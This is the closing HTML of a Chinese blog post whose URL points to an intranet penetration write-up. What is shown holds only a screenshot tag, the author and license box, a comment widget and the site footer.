+<p><img src="https://img.5ime.cn/msa-intranet-penetration/image-20240102144231882.png" alt="image-20240102144231882"></p>   </div> <div class="mt-12 pt-8 border-t border-gray-200"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 leading-relaxed relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10"> <div class="mb-2"> <strong class="text-gray-900">本文作者：</strong> <span>iami233</span> </div> <div class="mb-2"> <strong class="text-gray-900">本文链接：</strong> <a href="https://5ime.cn/msa-intranet-penetration/" title="https://5ime.cn/msa-intranet-penetration/" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all"> https://5ime.cn/msa-intranet-penetration/ </a> </div> <div> <strong class="text-gray-900">版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank" rel="external nofollow noopener noreferrer" class="text-blue-600 hover:text-blue-800">
+CC BY-NC-SA 3.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>  </div>  </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.DeGMrsLV.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-[rgb(var(--gray))] bg-gradient-to-b from-transparent to-[rgb(var(--gray-gradient))]">
+&copy; 2025 iami233. All rights reserved.
+</footer> <script type="module" src="/_astro/BlogPost.astro_astro_type_script_index_1_lang.znP5JH7M.js"></script></body></html>
